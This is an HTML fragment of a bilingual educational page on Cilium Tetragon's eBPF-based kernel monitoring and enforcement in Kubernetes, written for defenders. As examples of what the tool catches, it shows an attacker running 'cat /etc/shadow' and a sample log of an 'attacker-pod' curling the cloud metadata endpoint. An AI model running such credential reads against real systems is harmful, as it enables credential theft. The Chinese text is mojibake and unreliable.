        <p style="font-size: 0.9rem;"><span lang="zh">ç›‘æ§å…³é”®è·¯å¾„ï¼šæ•æ„Ÿé…ç½®æ–‡ä»¶ï¼ˆå¦‚ <code>/etc/shadow</code>ï¼‰æ˜¯å¦è¢«æœªæˆæƒç¯¡æ”¹æˆ–éæ³•è¯»å–ï¼Ÿ</span><span lang="en">Monitoring critical paths: Is <code>/etc/shadow</code> being tampered with or read illegally?</span></p>
    </div>
    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
        <strong><span lang="zh">ç½‘ç»œé€šä¿¡</span><span lang="en">Network Communication</span></strong>
        <p style="font-size: 0.9rem;"><span lang="zh">æ„ŸçŸ¥è¿æ¥æ„å›¾ï¼šè¿›ç¨‹æ˜¯å¦å»ºç«‹äº†éé¢„æœŸçš„å¤–è¿æˆ–å°è¯•è®¿é—®æ¶æ„çš„ C2 åŸŸåï¼Ÿ</span><span lang="en">Sensing intent: Is the process making unexpected outbound connections?</span></p>
    </div>
    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
        <strong><span lang="zh">ç‰¹æƒå˜æ›´</span><span lang="en">Privilege Escalation</span></strong>
        <p style="font-size: 0.9rem;"><span lang="zh">è¯†åˆ«è¶Šæƒè¡Œä¸ºï¼šæ™®é€šç”¨æˆ·è¿›ç¨‹æ˜¯å¦çªç„¶ææƒå˜æˆ Rootï¼Ÿæ˜¯å¦å‘ç”Ÿäº†å¼‚å¸¸çš„ Capability å˜æ›´ï¼Ÿ</span><span lang="en">Identifying hijacking: Has a normal process suddenly elevated to Root?</span></p>
    </div>
</div>
                </div>
            </div>
        </section>
        <section id="what-is-tetragon" style="background: #F9FAFB; padding: 80px 0;">
            <div class="container">
                <p
                    style="color: var(--cisco-blue); font-weight: 600; text-align: center; margin-bottom: 40px; letter-spacing: 2px;">
                    <span lang="zh">[ 2/4: å·¥å…·è§£æ„ ]</span><span lang="en">[ 2/4: Tool Deconstruction ]</span>
                </p>

                <div class="section-header">
                    <h2><span lang="zh">ä»€ä¹ˆæ˜¯ Tetragon?</span><span lang="en">What is Tetragon?</span></h2>
                    <p style="margin-top: 20px;">
                        <span lang="zh">Tetragon æ˜¯ Cilium å¼€æºç¤¾åŒºä¸‹çš„æ ¸å¿ƒé¡¹ç›®ï¼Œå®ƒåˆ©ç”¨ <b>eBPF</b> æŠ€æœ¯æä¾›æ·±åº¦çš„å†…æ ¸çº§å®‰å…¨è§‚æµ‹ã€‚ä¸åŒäºä¼ ç»Ÿçš„å®‰å…¨å·¥å…·ï¼Œå®ƒèƒ½æ„ŸçŸ¥
                            <b>Kubernetes èº«ä»½</b>ï¼ˆPod, Namespace, Labelsï¼‰ï¼Œå¹¶åœ¨æ¶æ„è¡Œä¸ºå‘ç”Ÿçš„ç¬é—´åœ¨å†…æ ¸æ€å°†å…¶é˜»æ–­ã€‚ä¼ ç»Ÿå®‰å…¨ä¾èµ–ç”¨æˆ·æ€
                            Agentï¼Œå®¹æ˜“è¢«ç»•è¿‡ã€‚Tetragon æŒ‚è½½åœ¨å†…æ ¸æ‰§è¡Œè·¯å¾„çš„æ ¸å¿ƒç‚¹ï¼ˆå¦‚ LSM æˆ–ç³»ç»Ÿè°ƒç”¨å…¥å£ï¼‰ï¼Œæä¾›â€œä¸å¯ç»•è¿‡â€çš„å®¡è®¡ä¸€è‡´æ€§ã€‚</span>
                        <span lang="en">Tetragon is a core project under the Cilium open-source community, utilizing
                            <b>eBPF</b> technology to provide deep kernel-level security observability. Unlike
                            traditional security tools, it is aware of <b>Kubernetes identities</b> (Pod, Namespace,
                            Labels) and blocks malicious behavior instantly in the kernel. Traditional security relies
                            on user-space agents, which are easily bypassed. Tetragon is mounted at core execution
                            points (such as LSM or syscall entry) to provide "unbypassable" audit consistency.</span>
                    </p>
                </div>

                <div style="text-align: center; margin: 50px 0 60px;">
                    <div class="star-badge">
                        <span lang="zh">âœ¨ æ ¸å¿ƒç‚¹ (The Star): å†…æ ¸æ€åŒæ­¥é˜»æ–­</span><span lang="en">âœ¨ Core Point: In-Kernel
                            Synchronous Enforcement</span>
                    </div>
                    <p style="font-size: 0.95rem; color: #666; margin-top: 15px;">
                        <span lang="zh">è®°ä½è¿™ä¸ªæ¦‚å¿µï¼šTetragon ä¸ä»…ä»…æ˜¯â€œçœ‹åˆ°â€å¨èƒï¼Œè€Œæ˜¯åœ¨å¨èƒå‘ç”Ÿ<b>ä¹‹å‰</b>ç”±å†…æ ¸ç›´æ¥å¼ºåˆ¶ä¸­æ–­ã€‚</span>
                        <span lang="en">Remember this: Tetragon doesn't just "see" threatsâ€”it is forcibly interrupted by
                            the kernel <b>before</b> the threat occurs.</span>
                    </p>
                </div>
<div class="mechanism-card" style="margin-top: 30px; border-left: 5px solid var(--cisco-blue); background: rgba(4, 159, 217, 0.02);">
    <h4 style="color: var(--cisco-midnight); margin-bottom: 12px;">
        <span lang="zh">ğŸ” æ ¸å¿ƒç—›ç‚¹ï¼šä¸ºä»€ä¹ˆä»…æœ‰å†…æ ¸è§‚æµ‹æ˜¯ä¸å¤Ÿçš„ï¼Ÿ</span>
        <span lang="en">ğŸ” Core Painpoint: Why Kernel Observability Alone Isn't Enough?</span>
    </h4>
    <p style="font-size: 0.95rem; line-height: 1.6;">
        <span lang="zh">ä¼ ç»Ÿçš„å†…æ ¸å®‰å…¨å·¥å…·ï¼ˆå¦‚ <code>auditd</code>ï¼‰å­˜åœ¨ä¸€ä¸ªè‡´å‘½çš„<b>â€œè®¤çŸ¥æ–­å±‚â€</b>ï¼šå†…æ ¸åªè®¤è¯† <b>PID 2550</b> æˆ– <b>åå…­è¿›åˆ¶å†…å­˜åœ°å€</b>ã€‚ä½†åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸‹ï¼ŒIP æ˜¯æ¼‚ç§»çš„ï¼ŒPID æ˜¯ä¼šè¢«è¿…é€Ÿå›æ”¶çš„ã€‚å¦‚æœå®‰å…¨æ—¥å¿—åªå‘Šè¯‰ä½ â€œPID 2550 åˆ é™¤äº†æ–‡ä»¶â€ï¼Œä½ æ ¹æœ¬æ— æ³•åˆ¤æ–­è¿™æ˜¯æ¥è‡ªå“ªä¸ªä¸šåŠ¡ Podã€‚</span>
        <span lang="en">Traditional kernel security tools (like <code>auditd</code>) suffer from a <b>"Context Gap"</b>: the kernel only knows <b>PID 2550</b> or <b>Hex memory addresses</b>. In cloud-native environments, IPs drift and PIDs are recycled. Knowing "PID 2550 deleted a file" is useless without knowing which Pod it belongs to.</span>
    </p>
    <div style="background: #FFF; padding: 15px; border-radius: 8px; border: 1px dashed var(--cisco-platinum); margin-top: 10px;">
        <p style="margin:0; font-style: italic; color: var(--cisco-midnight); font-size: 0.9rem;">
            <span lang="zh"><strong>Tetragon çš„è§£æ³•ï¼š</strong> å®ƒåœ¨å†…æ ¸é‡‡é›†æ•°æ®çš„ç¬é—´ï¼Œå°±åˆ©ç”¨ BPF Maps å°†è¿™äº›æ¯ç‡¥çš„å†…æ ¸ ID ç¿»è¯‘æˆäº† K8s çš„èº«ä»½æ ‡ç­¾ã€‚</span>
            <span lang="en"><strong>Tetragon's Solution:</strong> It uses BPF Maps to translate dry kernel IDs into K8s identity labels at the exact moment of data collection.</span>
        </p>
    </div>
</div>
                <div class="identity-box">
                    <div style="flex: 1.2;">
                        <div class="case-badge" style="background: var(--cisco-blue);">Expert Deep Dive</div>
                        <h3 style="margin-bottom:20px;">
                            <span lang="zh">ä¸ºä»€ä¹ˆèº«ä»½æ„ŸçŸ¥ (Identity-Aware) è‡³å…³é‡è¦ï¼Ÿ</span><span lang="en">Why is
                                Identity-Awareness Crucial?</span>
                        </h3>
                        <p style="font-size: 1.05rem; margin-bottom: 25px;">
                            <span lang="zh">åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­ï¼ŒIP åœ°å€æ˜¯è½¬ç¬å³é€çš„ï¼ŒPID åœ¨ä¸åŒå®¹å™¨é—´å¯èƒ½å†²çªã€‚Tetragon çš„æ ¸å¿ƒèƒ½åŠ›åœ¨äºå®ƒèƒ½<b>å®æ—¶æ„ŸçŸ¥ä¸Šä¸‹æ–‡</b>ã€‚</span>
                            <span lang="en">In cloud-native environments, IPs are ephemeral and PIDs may conflict between different containers.
                                Tetragon's strength is its <b>real-time context awareness</b>.</span>
                        </p>
                        <ul style="padding-left: 20px; list-style-type: disc;">
                            <li style="margin-bottom: 12px;">
                                <b><span lang="zh">task_struct å…³è”ï¼š</span><span lang="en">task_struct
                                        Association:</span></b>
                                <span lang="zh">ç›´æ¥ä»å†…æ ¸è¿›ç¨‹ç»“æ„ä½“è·å– Cgroup ä¿¡æ¯ã€‚</span><span lang="en">Directly retrieve Cgroup
                                    info from kernel process structures.</span>
                            </li>
                            <li style="margin-bottom: 12px;">
                                <b><span lang="zh">é›¶å¼€é”€æ˜ å°„ï¼š</span><span lang="en">Zero-Overhead Mapping:</span></b>
                                <span lang="zh">åˆ©ç”¨ eBPF Map å°† Cgroup ID æ¯«ç§’çº§æ˜ å°„åˆ° K8s Pod æ ‡ç­¾ã€‚</span><span lang="en">Mapping
                                    Cgroup IDs to K8s Pod labels via eBPF Maps in milliseconds.</span>
                            </li>
                            <li style="margin-bottom: 12px;">
                                <b><span lang="zh">å®¡è®¡ä¸€è‡´æ€§ï¼š</span><span lang="en">Audit Consistency:</span></b>
                                <span lang="zh">æ—¥å¿—ä¸­è‡ªå¸¦ Namespace/ServiceAccountï¼Œæ— éœ€äº‹åä»æ—¥å¿—ä¸­å¿ƒè¿›è¡Œå¤æ‚çš„ Trace ID å…³è”ã€‚</span><span
                                    lang="en">Logs include Namespace/ServiceAccount info, eliminating complex post-event
                                    Trace ID correlation.</span>
                            </li>
                        </ul>
                    </div>
<div class="identity-visual live-sync">
    <div class="live-indicator">
        <span class="live-dot"></span>
        <span lang="zh">å†…æ ¸å®æ—¶å…³è”ä¸­</span><span lang="en">Live Kernel Correlation</span>
    </div>
    <div style="font-family: 'SF Mono', monospace; font-size: 0.85rem; line-height: 1.6;">
        <span style="color: #888;">// 1. åº•å±‚å†…æ ¸ä¿¡å· (Raw Kernel Signal)</span><br>
        PID: <span style="color: var(--cisco-blue);">2550</span><br>
        SYS_CALL: <span style="color: var(--cisco-red);">connect()</span><br>
        DEST: <span style="color: #555;">185.151.x.x</span><br>
        
        <div style="margin: 10px 0; border-top: 1px dashed #CBD5E1; position: relative;">
            <div style="position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background: #FFF; padding: 0 10px; font-size: 10px; color: var(--cisco-blue); font-weight: bold;">
                eBPF MAP LOOKUP
            </div>
        </div>

        <span style="color: #888;">// 2. Tetragon èº«ä»½æ³¨å…¥ (Identity Enrichment)</span><br>
        POD: <span style="color: var(--cisco-orange);">payment-api-v2-7f8c</span><br>
        NAMESPACE: <span style="color: var(--cisco-midnight);">production</span><br>
        SERVICE_ACCOUNT: <span style="color: #555;">payment-service</span><br>
        LABELS: <span style="color: var(--cisco-blue);">env=prod, app=payment, version=2.1</span>
    </div>
</div>
                </div>
<div class="mechanism-card" style="margin-top: -20px; border-top: none; border-radius: 0 0 12px 12px;">
    <h4 style="margin-bottom: 20px; color: var(--cisco-midnight);">
        <span lang="zh">æ•°æ®äº§å‡ºï¼šç»“æ„åŒ–èº«ä»½æ„ŸçŸ¥æ—¥å¿—</span>
        <span lang="en">The Output: Identity-Aware Structured Logs</span>
    </h4>
    
    <p style="font-size: 0.95rem; color: var(--cisco-slate);">
        <span lang="zh">èº«ä»½æ„ŸçŸ¥ä¸ä»…ä»…æ˜¯è§†è§‰ç‚¹ç¼€ï¼Œå®ƒä½“ç°åœ¨æ¯ä¸€æ¡å®¡è®¡æ—¥å¿—ä¸­ã€‚Tetragon è‡ªåŠ¨å°†å†…æ ¸ç³»ç»Ÿè°ƒç”¨ä¸ Kubernetes å…ƒæ•°æ®èšåˆï¼Œæ¶ˆé™¤äº†äº‹åæ‰‹åŠ¨å…³è”çš„ç—›è‹¦ã€‚</span>
        <span lang="en">Identity-awareness is more than visual flair; it's embedded in every audit log. Tetragon automatically aggregates kernel syscalls with Kubernetes metadata, eliminating the pain of manual post-event correlation.</span>
    </p>

    <div class="yaml-block" style="background: #1A1F2B; border-left-color: var(--cisco-blue);">
<span style="color: #6A9955;">// [Tetragon Audit Event] Identity-Aware Payload</span>
{
  <span class="yaml-key">"process_kprobe"</span>: {
    <span class="yaml-key">"process"</span>: {
      <span class="yaml-key">"exec_id"</span>: <span class="log-highlight-exec">"MTY4NDI6MTAyO..."</span>, <span style="color: #6A9955;">// Unique across cluster</span>
      <span class="yaml-key">"binary"</span>: <span class="yaml-val">"/usr/bin/curl"</span>,
      <span class="yaml-key">"arguments"</span>: <span class="yaml-val">"http://metadata.google.internal/..."</span>,
      <span class="log-highlight-identity">"pod"</span>: {
        <span class="log-highlight-identity">"name"</span>: <span class="yaml-val">"attacker-pod"</span>,
        <span class="log-highlight-identity">"namespace"</span>: <span class="yaml-val">"default"</span>,
        <span class="log-highlight-identity">"labels"</span>: [<span class="yaml-val">"app=web-frontend"</span>]
      },
      <span class="yaml-key">"user"</span>: <span class="yaml-val">"root"</span>
    },
    <span class="yaml-key">"function_name"</span>: <span class="yaml-val">"tcp_connect"</span>,
    <span class="yaml-key">"action"</span>: <span class="yaml-val">"KPROBE_ACTION_POST"</span>
  }
}</div>

    <div class="value-point-grid">
        <div class="value-point-item">
            <strong><span lang="zh">æ— ç—›å…³è” K8s èº«ä»½</span><span lang="en">Painless K8s Correlation</span></strong>
            <p style="font-size: 0.8rem; margin:0; color: #666;">
                <span lang="zh">æ— éœ€ IP-to-Pod æ˜ å°„ï¼Œæ—¥å¿—è‡ªå¸¦ Namespace ä¸ Label æ ‡ç­¾ã€‚</span>
                <span lang="en">No manual IP-to-Pod mapping; logs come pre-enriched with metadata.</span>
            </p>
        </div>
        <div class="value-point-item" style="border-top-color: var(--cisco-green);">
            <strong><span lang="zh">äºŒè¿›åˆ¶æ–‡ä»¶æ ¡éªŒ</span><span lang="en">Binary Verification</span></strong>
            <p style="font-size: 0.8rem; margin:0; color: #666;">
                <span lang="zh">ç²¾ç¡®è¯†åˆ«æ‰§è¡Œè·¯å¾„ï¼Œç»“åˆ SBOM ç¡®ä¿åªæœ‰å—ä¿¡ä»»çš„ç¨‹åºåœ¨è¿è¡Œã€‚</span>
                <span lang="en">Identify paths precisely; integrate with SBOM to ensure trusted execution.</span>
            </p>
        </div>
        <div class="value-point-item" style="border-top-color: var(--cisco-orange);">
            <strong><span lang="zh">è¿›ç¨‹æ ‘è¡€ç¼˜åˆ†æ</span><span lang="en">Ancestry Analysis</span></strong>
            <p style="font-size: 0.8rem; margin:0; color: #666;">
                <span lang="zh">åˆ©ç”¨ <code>exec_id</code> è¿½æº¯çˆ¶å­è¿›ç¨‹å…³ç³»ï¼Œæ„å»ºå®Œæ•´çš„æ”»å‡»é“¾è·¯ã€‚</span>
                <span lang="en">Use <code>exec_id</code> to track parent-child relations and build attack chains.</span>
            </p>
        </div>
    </div>
</div>
                <div class="view-section" style="margin-top: 80px;">
                    <div class="view-title">
                        <span lang="zh">æ ¸å¿ƒçµé­‚ï¼šTracingPolicy</span><span lang="en">The Core Soul: TracingPolicy</span>
                    </div>
                    <p style="margin-bottom: 30px;">
                        <span lang="zh">TracingPolicy æ˜¯ä¸€ç§ CRDï¼ˆè‡ªå®šä¹‰èµ„æºå£°æ˜ï¼‰ï¼Œå®ƒå®šä¹‰äº†å…³é”®è¦ç´ ï¼š</span>
                        <span lang="en">TracingPolicy is a CRD (Custom Resource Definition) that defines:</span>
                    </p>
                    <div class="grid-3">
                        <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                            <strong><span lang="zh">è§¦å‘æ¡ä»¶ (Trigger)</span><span lang="en">Trigger
                                    Conditions</span></strong>
                            <p style="font-size: 0.95rem; margin-top:15px;">
                                <span lang="zh">ç‰¹å®šçš„ç³»ç»Ÿè°ƒç”¨ï¼ˆSyscallsï¼‰æˆ–å†…æ ¸å‡½æ•°åŠå…¶å‚æ•°ã€‚ä¾‹å¦‚ï¼šç›‘æ§ <code>execve</code> å¯åŠ¨ shell
                                    çš„è¡Œä¸ºã€‚</span>
                                <span lang="en">Specific syscalls or kernel functions and their arguments. E.g.,
                                    monitoring <code>execve</code> to detect shell launches.</span>
                            </p>
                        </div>
                        <div class="card" style="border-top: 4px solid var(--cisco-midnight);">
                            <strong><span lang="zh">ç²¾å‡†å‚æ•°è¿‡æ»¤ (Argument Filtering)</span><span lang="en">Precise Argument
                                    Filtering</span></strong>
                            <p style="font-size: 0.95rem; margin-top:15px;">
                                <b>[<span lang="zh">æ–°ç‰¹æ€§</span><span lang="en">New</span>]</b>
                                <span lang="zh">æ”¯æŒå¯¹ç³»ç»Ÿè°ƒç”¨å‚æ•°çš„æ·±åº¦åŒ¹é…ã€‚ä¾‹å¦‚ï¼šä»…ç›‘æ§å¯¹ <code>/etc/</code> ç›®å½•ä¸‹ä»¥ <code>.conf</code>
                                    ç»“å°¾æ–‡ä»¶çš„å†™æ“ä½œï¼Œæˆ–è€…åŒ¹é…ç‰¹å®šçš„ç¯å¢ƒå˜é‡ã€‚</span>
                                <span lang="en">Supports deep matching of syscall arguments. E.g., only monitoring write
                                    operations to <code>.conf</code> files in <code>/etc/</code>,or match specific environment variables.</span>
                            </p>
                        </div>
                        <div class="card" style="border-top: 4px solid var(--cisco-midnight);">
                            <strong><span lang="zh">å¤„ç½®åŠ¨ä½œ (Action)</span><span lang="en">Enforcement
                                    Actions</span></strong>
                            <p style="font-size: 0.95rem; margin-top:15px;">
                                <span lang="zh">è§‚æµ‹è®°å½•ã€å‘é€ä¿¡å·ï¼ˆå¦‚ <b>SIGKILL</b>ï¼‰æˆ–è¦†ç›–è¿”å›å€¼ï¼ˆé˜»æ­¢æ¶æ„å†™å…¥ç”Ÿæ•ˆï¼‰ã€‚</span>
                                <span lang="en">Observation logging, sending signals (e.g., <b>SIGKILL</b>), or
                                    overriding return values to block malicious writes.</span>
                            </p>
                        </div>
                    </div>

                    <div class="dc-observer-post" style="margin-top: 50px;">
                        <p style="font-size: 0.95rem; margin: 0;">
                            <strong><span lang="zh">åœºæ™¯å…³è”ï¼š</span><span lang="en">Scenario Correlation:</span></strong>
                            <span lang="zh">æ­¤æ—¶æ”»å‡»è€…æ­£åœ¨å°è¯•æ‰§è¡Œ <code>cat /etc/shadow</code>ã€‚å¦‚æœæ²¡æœ‰
                                TracingPolicyï¼Œè¿™ä¸ªè¡Œä¸ºä¼šæ·¹æ²¡åœ¨æµ·é‡çš„ç³»ç»Ÿæ—¥å¿—ä¸­ã€‚Tetragon çš„ä»·å€¼åœ¨äºå®ƒèƒ½ç²¾ç¡®é”å®šè¿™ä¸ªâ€œç¬é—´â€ã€‚</span>
                            <span lang="en">The attacker is attempting to execute <code>cat /etc/shadow</code>. Without
                                TracingPolicy, this would be buried in massive logs. Tetragon pinpoints this exact
                                "moment."</span>
                        </p>
                    </div>

                    <div class="expert-persp-box" style="margin-top: 60px; padding: 40px;">
                        <h4 style="color:var(--white)"><span lang="zh">ä¸“å®¶è§†è§’ (Expert Perspective):</span><span
                                lang="en">Expert Perspective:</span></h4>
                        <p style="font-size: 1.05rem; margin-top:20px; opacity:0.95; line-height: 1.8;">
                            <span lang="zh">Tetragon ä½¿ç”¨ <b>Kprobes</b> å’Œ <b>Tracepoints</b> æ‹¦æˆªå†…æ ¸äº‹ä»¶ã€‚é€šè¿‡ <b>BPF Maps</b>
                                å°†å†…æ ¸æ•°æ®é«˜æ•ˆä¼ é€’è‡³ç”¨æˆ·æ€çš„ Tetragon Agent åŠå…¶å¯¼å‡ºçš„ JSON æ—¥å¿—ã€‚è¿™ç§æ¶æ„ç¡®ä¿äº†åœ¨å¾®ç§’çº§åˆ«æ•è·å¹¶å¤„ç†å¨èƒï¼Œè€Œä¸äº§ç”Ÿæ˜æ˜¾çš„ä¸šåŠ¡æŠ–åŠ¨ã€‚</span>
                            <span lang="en">Tetragon uses <b>Kprobes</b> and <b>Tracepoints</b> to intercept kernel
                                events. It efficiently passes kernel data to the Tetragon Agent via <b>BPF Maps</b>.
                                This architecture ensures threat capture and processing at microsecond levels without
                                business jitter.</span>
                        </p>
                    </div>
                </div>
            </div>
        </section>
        <section id="perspectives">
            <div class="container">
                <div class="view-section">
                    <div class="view-title">
                        <span lang="zh">ä¸šåŠ¡è§†è§’ (ç±»æ¯”)</span><span lang="en">Business Perspective (Analogy)</span>
                    </div>
                    <div class="grid-3">
                        <div class="card">
                            <h3><span lang="zh">ä¼ ç»Ÿå®‰å…¨ï¼šæ‘„åƒå¤´</span><span lang="en">Traditional Security: Camera</span></h3>
                            <p>
                                <span
                                    lang="zh">ä»¥å‰çš„å®‰å…¨å·¥å…·ï¼ˆå¦‚æ—¥å¿—åˆ†æï¼‰å°±åƒæ˜¯æ‘„åƒå¤´ã€‚å®ƒèƒ½å½•ä¸‹å°å·è¡Œçªƒçš„è¿‡ç¨‹ï¼Œä½†å½“ä½ å‘ç°å½•åƒæ—¶ï¼Œå°å·æ—©å°±è·‘äº†ï¼Œè´¢äº§ä¹ŸæŸå¤±äº†ã€‚è¿™æ˜¯<b>â€œå¼‚æ­¥æ£€æµ‹â€</b>ã€‚</span>
                                <span lang="en">Previous security tools (like log analysis) are like cameras. They
                                    record the theft, but by the time you see the footage, the thief is gone and the
                                    assets are lost. This is <b>"asynchronous detection."</b></span>
                            </p>
                        </div>
                        <div class="card">
                            <h3><span lang="zh">Sidecar æ¨¡å¼ï¼šå®‰æ£€é—¨</span><span lang="en">Sidecar Mode: Security Gate</span>
                            </h3>
                            <p>
                                <span lang="zh">Sidecar ä»£ç†å°±åƒåœ¨æ¯ä¸ªæˆ¿é—´é—¨å£è®¾å®‰æ£€ã€‚è™½ç„¶èƒ½é˜»æ‹¦ï¼Œä½†æ¯ä¸ªäººè¿›å‡ºéƒ½è¦æ’é˜Ÿï¼Œå¯¼è‡´å¤§æ¥¼ï¼ˆæœåŠ¡å™¨ï¼‰æ‹¥å µï¼Œæ€§èƒ½ä¸‹é™ï¼Œä¸”å®¹æ˜“è¢«
                                    ç»•è¿‡ã€‚</span>
                                <span lang="en">Sidecar proxies are like security gates at every door. While they can
                                    block access, everyone must wait in line, leading to server congestion, performance
                                    degradation, and potential bypasses.</span>
                            </p>
                        </div>
                        <div class="card">
                            <h3><span lang="zh">Tetragonï¼šæ™ºèƒ½å…ç–«</span><span lang="en">Tetragon: Smart Immunity</span></h3>
                            <p>
                                <span lang="zh">Tetragon
                                    å°±åƒäººä½“å…ç–«ç»†èƒï¼Œç›´æ¥é©»æ‰åœ¨è¡€æ¶²ï¼ˆå†…æ ¸ï¼‰ä¸­ã€‚åªè¦è¯†åˆ«åˆ°ç—…æ¯’ï¼ˆæ¶æ„è¿›ç¨‹ï¼‰ï¼Œæ— éœ€ç­‰å¾…å¤§è„‘æŒ‡ä»¤ï¼Œç›´æ¥åå™¬ï¼ˆKillï¼‰ç—…æ¯’ã€‚è¿™æ˜¯<b>â€œåŒæ­¥é˜»æ–­â€</b>ã€‚</span>
                                <span lang="en">Tetragon is like immune cells living in the blood (kernel). Once a virus
                                    (malicious process) is identified, it kills it instantly without waiting for brain
                                    instructions. This is <b>"synchronous enforcement."</b></span>
                            </p>
                        </div>
                    </div>
                </div>

                <div class="mechanism-card"
                    style="background: #F8FAFC; border: 1px dashed var(--cisco-blue); margin: 80px 0; padding: 45px;">
                    <div style="display: flex; align-items: center; gap: 20px;">
                        <div style="font-size: 2.5rem;">ğŸ§ </div>
                        <div>
                            <strong
                                style="font-size: 1.25rem; color: var(--cisco-midnight); display: block; margin-bottom: 10px;">
                                <span lang="zh">æ€ç»´æ¨¡å‹ (The Mental Model):</span><span lang="en">The Mental Model:</span>
                            </strong>
                            <p style="margin:0; font-size: 1.05rem; line-height: 1.7;">
                                <span lang="zh">ç†è§£ Tetragon çš„æ·å¾„æ˜¯ï¼šå®ƒæ˜¯<b>â€œå†…æ ¸å†…åµŒå…¥çš„é€»è¾‘åˆ¤æ–­å™¨â€</b>ã€‚å®ƒå°† K8s çš„â€œèº«ä»½â€ä¸ syscall
                                    çš„â€œå‚æ•°â€ç»„åˆæˆä¸€ä¸ªå¸ƒå°”é€»è¾‘ï¼Œåªæœ‰â€œçœŸï¼ˆå…è®¸ï¼‰â€æ‰èƒ½æ‰§è¡Œï¼Œâ€œå‡ï¼ˆæ‹’ç»ï¼‰â€åˆ™ç«‹å³ç‰©ç†ç»ˆæ­¢ã€‚</span>
                                <span lang="en">The mental model for Tetragon: it is a <b>"logic decider embedded in the
                                        kernel."</b> It combines K8s "identity" with syscall "arguments" into Boolean
                                    logic: only "True" executes, "False" results in immediate physical
                                    termination.</span>
                            </p>
                        </div>
                    </div>
                </div>

                <div class="view-section">
                    <div class="view-title">
                        <span lang="zh">âš™ï¸ æŠ€æœ¯è§†è§’ï¼šå†…æ ¸æ·±å¤„çš„é˜²å¾¡æ¶æ„</span><span lang="en">âš™ï¸ Technical Perspective: Defense
                            Architecture Deep in the Kernel</span>
                    </div>
                    <div class="grid-3">
                        <div class="card">
                            <h3><span lang="zh">å†…æ ¸çº§å¯è§‚æµ‹æ€§</span><span lang="en">Kernel-level Observability</span></h3>
                            <p>
                                <span lang="zh">åˆ©ç”¨ eBPF (Extended Berkeley Packet Filter)ï¼ŒTetragon
                                    èƒ½å¤Ÿåœ¨ä¸ä¿®æ”¹å†…æ ¸æºç ã€ä¸åŠ è½½å†…æ ¸æ¨¡å—çš„æƒ…å†µä¸‹ï¼Œå®‰å…¨åœ°åŠ¨æ€è¿½è¸ªå†…æ ¸å‡½æ•°ï¼ˆkprobes, tracepointsï¼‰ã€‚</span>
                                <span lang="en">Leveraging eBPF, Tetragon can safely and dynamically trace kernel
                                    functions (kprobes, tracepoints) without modifying the kernel source or loading
                                    kernel modules.</span>
                            </p>
                        </div>
                        <div class="card">
                            <h3><span lang="zh">é›¶å¼€é”€æ•°æ®ä¸Šä¸‹æ–‡</span><span lang="en">Zero-Overhead Data Context</span></h3>
                            <p>
                                <span lang="zh">ä¼ ç»Ÿ eBPF å·¥å…·åªè¾“å‡º PID/IPã€‚Tetragon ç»´æŠ¤äº†ä¸€ä¸ªå†…æ ¸å†…çš„çŠ¶æ€è¡¨ï¼Œèƒ½å¤Ÿå³æ—¶å°†åº•å±‚çš„ç³»ç»Ÿè°ƒç”¨æ˜ å°„åˆ° Kubernetes çš„
                                    Pod, Namespace, Service ç­‰é«˜å±‚å…ƒæ•°æ®ã€‚</span>
                                <span lang="en">Traditional eBPF tools only output PID/IP. Tetragon maintains an
                                    in-kernel state table that instantly maps low-level syscalls to K8s Pods,
                                    Namespaces, and Services.</span>
                            </p>
                        </div>
                        <div class="card">
                            <h3><span lang="zh">In-Kernel Enforcement</span><span lang="en">In-Kernel Enforcement</span>
                            </h3>
                            <p>
                                <span lang="zh">Tetragon ä¸ä»…ä»…æ˜¯â€œè§‚å¯Ÿè€…â€ã€‚å®ƒä½¿ç”¨ <code>bpf_send_signal</code> åœ¨æ¶æ„ syscall
                                    å®Œæˆå‰ç»ˆæ­¢è¿›ç¨‹ï¼Œæœç»äº† <b>TOCTOU æ”»å‡»</b>ã€‚</span>
                                <span lang="en">Tetragon is more than an "observer." It uses
                                    <code>bpf_send_signal</code> to terminate processes before a malicious syscall
                                    completes, eliminating <b>TOCTOU attacks</b>.</span>
                            </p>
                            <div
                                style="font-size: 0.85rem; background: #FFF5F5; padding: 15px; border-radius: 6px; margin-top: 15px; border: 1px solid #FFDADA;">
                                <strong style="color: var(--cisco-red);">
                                    <span lang="zh">åè¯è§£é‡Šï¼šTOCTOU æ”»å‡»</span><span lang="en">Term: TOCTOU Attack</span>
                                </strong><br>
                                <span lang="zh">Time-of-Check to
                                    Time-of-Useã€‚æŒ‡æ”»å‡»è€…åœ¨å®‰å…¨æ£€æŸ¥åä¸å®é™…æ‰§è¡Œå‰çš„æ—¶é—´å·®å†…ï¼Œæ›¿æ¢äº†åŸæœ¬æ£€æŸ¥é€šè¿‡çš„èµ„æºï¼ˆå¦‚æ–‡ä»¶é“¾æ¥ï¼‰ï¼Œä»è€Œç»•è¿‡ç”¨æˆ·æ€å®‰å…¨å·¥å…·ã€‚</span>
                                <span lang="en">Time-of-Check to Time-of-Use. This refers to the time gap between
                                    security check and execution where an attacker replaces a validated resource to
                                    bypass security tools.</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="how-it-works" style="background: white; padding: 100px 0;">
            <div class="container">
                <p
                    style="color: var(--cisco-blue); font-weight: 600; text-align: center; margin-bottom: 40px; letter-spacing: 2px;">
                    <span lang="zh">[ 3/4: æ·±åº¦è§£æ ]</span><span lang="en">[ 3/4: Deep Dive ]</span>
                </p>

                <div class="section-header">
                    <h2>
                        <span lang="zh">æŠ€æœ¯æ¶æ„ï¼šTetragon çš„è¿è¡Œé€»è¾‘</span>
                        <span lang="en">Technical Architecture: Tetragon's Logic</span>
                    </h2>
                    <p style="margin-top: 20px;">
                        <span lang="zh">ä¸‹å›¾å±•ç¤ºäº† Tetragon å¦‚ä½•åˆ©ç”¨ <b>kprobes</b> è¿›è¡Œæ·±åº¦è§‚æµ‹ï¼Œå¹¶åˆ©ç”¨å†…æ ¸ <b>LSM BPF</b>
                            å®ç°ä¸å¯ç»•è¿‡çš„å®‰å…¨é˜»æ–­ã€‚</span>
                        <span lang="en">The diagram below illustrates how Tetragon utilizes <b>kprobes</b> for deep
                            observation and leverages kernel <b>LSM BPF</b> for unbypassable security
                            enforcement.</span>
                    </p>
                </div>

                <p
                    style="text-align: center; max-width: 800px; margin: 0 auto 50px; font-style: italic; color: #666; line-height: 1.6;">
